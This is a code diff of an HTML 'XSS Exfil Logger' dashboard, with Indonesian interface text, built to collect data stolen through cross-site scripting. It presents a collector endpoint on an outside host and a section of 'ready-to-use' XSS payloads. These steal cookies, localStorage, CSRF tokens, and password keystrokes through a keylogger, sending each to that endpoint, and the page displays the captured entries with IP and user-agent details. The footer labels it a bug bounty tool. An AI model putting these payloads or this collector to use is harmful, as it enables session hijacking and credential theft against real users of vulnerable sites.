@@ -1,37 +1,585 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>XSS Exfil Logger - PoC</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; line-height: 1.5; }
-    pre { background: #222; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; }
-    h1 { color: #0f8; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Exfil Logger Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            border-radius: 8px 8px 0 0;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        header h1 {
+            margin-bottom: 10px;
+            font-size: 2em;
+        }
+        
+        .info-panel {
+            background: #34495e;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+        
+        .info-panel p {
+            margin: 5px 0;
+        }
+        
+        .info-panel code {
+            background: #2c3e50;
+            padding: 3px 6px;
+            border-radius: 3px;
+            color: #ecf0f1;
+        }
+        
+        .endpoint-box {
+            background: #27ae60;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .endpoint-box h3 {
+            margin-bottom: 10px;
+        }
+        
+        .endpoint-url {
+            background: #2c3e50;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.2em;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        
+        .copy-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #2980b9;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.95em;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #3498db;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #2980b9;
+        }
+        
+        .btn-danger {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #c0392b;
+        }
+        
+        .btn-success {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .btn-success:hover {
+            background: #229954;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            color: #7f8c8d;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .stat-card .value {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-top: 10px;
+        }
+        
+        .filters {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .filter-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        
+        .filter-group input, .filter-group select {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 0.95em;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .data-table {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: #34495e;
+            color: white;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #ecf0f1;
+            vertical-align: top;
+        }
+        
+        tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .data-cell {
+            max-width: 300px;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9em;
+            background: #f8f9fa;
+            padding: 8px;
+            border-radius: 4px;
+        }
+        
+        .timestamp {
+            color: #7f8c8d;
+            font-size: 0.85em;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.75em;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        
+        .badge-get {
+            background: #3498db;
+            color: white;
+        }
+        
+        .badge-post {
+            background: #27ae60;
+            color: white;
+        }
+        
+        .ip-address {
+            font-family: monospace;
+            color: #e67e22;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 50px;
+            color: #95a5a6;
+        }
+        
+        .empty-state i {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+        
+        .payload-examples {
+            background: #ecf0f1;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 30px;
+        }
+        
+        .payload-examples h3 {
+            margin-bottom: 15px;
+            color: #2c3e50;
+        }
+        
+        .payload-code {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            margin: 10px 0;
+            overflow-x: auto;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 0.9em;
+        }
+    </style>
 </head>
 <body>
-  <h1>XSS Exfil Logger (GET Version)</h1>
-  <p>Data exfil dari XSS akan muncul di bawah ini secara otomatis saat link dibuka.</p>
-  <p><strong>Cara test:</strong> Jalankan payload XSS → refresh halaman ini untuk lihat data terbaru.</p>
-  <hr>
-
-  <h2>Received Exfil Data:</h2>
-  <pre id="log">Belum ada data... (buka payload XSS lalu refresh halaman ini)</pre>
-
-  <script>
-    // Baca query string dari URL
-    const urlParams = new URLSearchParams(window.location.search);
-    const rawData = urlParams.get('data');
-
-    if (rawData) {
-      try {
-        const parsed = JSON.parse(rawData);
-        document.getElementById('log').textContent = JSON.stringify(parsed, null, 2);
-      } catch (e) {
-        document.getElementById('log').textContent = 'Error parsing data: ' + e.message + '\nRaw: ' + rawData;
-      }
-    }
-  </script>
+    <div class="container">
+        <header>
+            <h1>🔍 XSS Exfil Logger Dashboard</h1>
+            <p>Real-time data exfiltration collector untuk proof-of-concept XSS</p>
+            
+            <div class="info-panel">
+                <p><strong>📌 Cara menggunakan:</strong></p>
+                <p>1. Gunakan endpoint di bawah ini dalam payload XSS Anda</p>
+                <p>2. Data akan otomatis muncul di dashboard ini</p>
+                <p>3. Refresh halaman untuk melihat data terbaru</p>
+                <p><strong>⚠️ Catatan:</strong> Data disimpan sementara di memory (max 100 entry). Akan hilang jika function cold start.</p>
+            </div>
+        </header>
+        
+        <div class="endpoint-box">
+            <h3>📡 Endpoint Logger</h3>
+            <p>Kirim data ke URL berikut (method GET atau POST):</p>
+            <div class="endpoint-url" id="endpointUrl">https://xss-exfil-logger.vercel.app/log</div>
+            <button class="copy-btn" onclick="copyEndpoint()">📋 Copy URL</button>
+            
+            <p style="margin-top: 15px;"><strong>Parameter yang didukung (GET):</strong> data, d, cookie, msg, source</p>
+            <p><strong>Contoh:</strong> /log?data=stolen_cookie_here&source=target-site.com</p>
+        </div>
+        
+        <div class="controls">
+            <button class="btn btn-primary" onclick="refreshData()">🔄 Refresh Data</button>
+            <button class="btn btn-success" onclick="testLogger()">🧪 Test Logger</button>
+            <button class="btn btn-danger" onclick="clearData()">🗑️ Clear All Data</button>
+        </div>
+        
+        <div class="stats" id="statsContainer">
+            <div class="stat-card">
+                <h3>Total Entries</h3>
+                <div class="value" id="totalEntries">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Unique IPs</h3>
+                <div class="value" id="uniqueIps">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Last 24 Hours</h3>
+                <div class="value" id="last24h">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>GET/POST</h3>
+                <div class="value" id="methodRatio">0/0</div>
+            </div>
+        </div>
+        
+        <div class="filters">
+            <div class="filter-group">
+                <input type="text" id="searchInput" placeholder="🔍 Cari di data, IP, atau source..." onkeyup="filterData()">
+                <select id="methodFilter" onchange="filterData()">
+                    <option value="all">Semua Method</option>
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                </select>
+                <input type="date" id="dateFilter" onchange="filterData()">
+            </div>
+        </div>
+        
+        <div class="data-table">
+            <table id="dataTable">
+                <thead>
+                    <tr>
+                        <th>Timestamp</th>
+                        <th>Method</th>
+                        <th>IP Address</th>
+                        <th>Source</th>
+                        <th>Data Exfiltrated</th>
+                        <th>User Agent</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr>
+                        <td colspan="6" class="empty-state">
+                            <div>📭 Belum ada data exfil</div>
+                            <small>Jalankan payload XSS lalu refresh halaman ini</small>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="payload-examples">
+            <h3>🚀 Contoh Payload XSS Siap Pakai</h3>
+            
+            <p><strong>1. Curi cookie (Image method - stealth):</strong></p>
+            <div class="payload-code">
+                &lt;script&gt;new Image().src='https://xss-exfil-logger.vercel.app/log?cookie='+document.cookie&lt;/script&gt;
+            </div>
+            
+            <p><strong>2. Curi cookie + localStorage (Fetch):</strong></p>
+            <div class="payload-code">
+                &lt;script&gt;fetch('https://xss-exfil-logger.vercel.app/log?data='+btoa(JSON.stringify({c:document.cookie,l:localStorage})));&lt;/script&gt;
+            </div>
+            
+            <p><strong>3. Keylogger sederhana untuk form login:</strong></p>
+            <div class="payload-code">
+                &lt;script&gt;document.getElementById('password').addEventListener('keyup',function(e){new Image().src='https://xss-exfil-logger.vercel.app/log?key='+e.target.value});&lt;/script&gt;
+            </div>
+            
+            <p><strong>4. Curi session token dari meta tag:</strong></p>
+            <div class="payload-code">
+                &lt;script&gt;new Image().src='https://xss-exfil-logger.vercel.app/log?token='+document.querySelector('meta[name="csrf-token"]').content&lt;/script&gt;
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>XSS Exfil Logger untuk Bug Bounty • Data tersimpan sementara di memory</p>
+        </div>
+    </div>
+    
+    <script>
+        // Fungsi untuk mengambil data dari server
+        async function fetchData() {
+            try {
+                // Untuk demo ini kita akan menggunakan localStorage sebagai backend simulator
+                // Dalam implementasi nyata, ini akan fetch dari API endpoint
+                const storedData = localStorage.getItem('xssExfilData');
+                return storedData ? JSON.parse(storedData) : [];
+            } catch (e) {
+                console.error('Error fetching data:', e);
+                return [];
+            }
+        }
+        
+        // Fungsi untuk menyimpan data (simulasi)
+        async function saveData(data) {
+            localStorage.setItem('xssExfilData', JSON.stringify(data));
+        }
+        
+        // Fungsi untuk refresh data
+        async function refreshData() {
+            // Simulasi - dalam implementasi nyata, ini akan fetch dari API
+            // Karena kita pakai localStorage, cukup render ulang
+            renderTable();
+        }
+        
+        // Fungsi untuk test logger
+        async function testLogger() {
+            const testData = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                method: 'GET',
+                ip: '127.0.0.1',
+                userAgent: navigator.userAgent,
+                data: 'test_data_' + Math.random().toString(36).substring(7),
+                source: 'manual_test'
+            };
+            
+            // Simpan ke localStorage
+            const existingData = await fetchData();
+            existingData.unshift(testData);
+            await saveData(existingData);
+            
+            renderTable();
+            
+            // Juga coba kirim ke endpoint real
+            try {
+                await fetch(`/log?data=test_from_dashboard&t=${Date.now()}`);
+            } catch (e) {
+                console.log('Test sent (ignore error if in static mode)');
+            }
+        }
+        
+        // Fungsi untuk clear data
+        async function clearData() {
+            if (confirm('Hapus semua data exfil?')) {
+                await saveData([]);
+                renderTable();
+            }
+        }
+        
+        // Fungsi untuk filter data
+        async function filterData() {
+            renderTable();
+        }
+        
+        // Fungsi untuk render tabel
+        async function renderTable() {
+            const data = await fetchData();
+            const tbody = document.getElementById('tableBody');
+            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+            const methodFilter = document.getElementById('methodFilter').value;
+            const dateFilter = document.getElementById('dateFilter').value;
+            
+            // Filter data
+            let filteredData = data.filter(item => {
+                // Filter method
+                if (methodFilter !== 'all' && item.method !== methodFilter) return false;
+                
+                // Filter date
+                if (dateFilter) {
+                    const itemDate = new Date(item.timestamp).toISOString().split('T')[0];
+                    if (itemDate !== dateFilter) return false;
+                }
+                
+                // Filter search
+                if (searchTerm) {
+                    const searchable = JSON.stringify(item).toLowerCase();
+                    return searchable.includes(searchTerm);
+                }
+                
+                return true;
+            });
+            
+            // Update stats
+            updateStats(data, filteredData);
+            
+            if (filteredData.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="6" class="empty-state">
+                            <div>📭 Tidak ada data yang cocok dengan filter</div>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            tbody.innerHTML = filteredData.map(item => `
+                <tr>
+                    <td class="timestamp">${new Date(item.timestamp).toLocaleString()}</td>
+                    <td><span class="badge ${item.method === 'GET' ? 'badge-get' : 'badge-post'}">${item.method}</span></td>
+                    <td class="ip-address">${item.ip || 'unknown'}</td>
+                    <td>${item.source || item.headers?.referer || '-'}</td>
+                    <td><div class="data-cell">${escapeHtml(JSON.stringify(item.data, null, 2))}</div></td>
+                    <td><small>${item.userAgent ? item.userAgent.substring(0, 50) + '...' : '-'}</small></td>
+                </tr>
+            `).join('');
+        }
+        
+        // Fungsi untuk update statistik
+        function updateStats(allData, filteredData) {
+            document.getElementById('totalEntries').textContent = filteredData.length;
+            
+            const uniqueIps = new Set(filteredData.map(d => d.ip)).size;
+            document.getElementById('uniqueIps').textContent = uniqueIps;
+            
+            const last24h = filteredData.filter(d => {
+                const age = Date.now() - new Date(d.timestamp).getTime();
+                return age < 24 * 60 * 60 * 1000;
+            }).length;
+            document.getElementById('last24h').textContent = last24h;
+            
+            const getCount = filteredData.filter(d => d.method === 'GET').length;
+            const postCount = filteredData.filter(d => d.method === 'POST').length;
+            document.getElementById('methodRatio').textContent = `${getCount}/${postCount}`;
+        }
+        
+        // Fungsi untuk escape HTML
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = typeof text === 'string' ? text : JSON.stringify(text);
+            return div.innerHTML;
+        }
+        
+        // Fungsi untuk copy endpoint
+        function copyEndpoint() {
+            const url = document.getElementById('endpointUrl').textContent;
+            navigator.clipboard.writeText(url).then(() => {
+                alert('Endpoint URL copied!');
+            });
+        }
+        
+        // Load data saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', () => {
+            renderTable();
+            
+            // Set interval untuk auto-refresh setiap 5 detik
+            setInterval(renderTable, 5000);
+        });
+    </script>
 </body>
 </html>
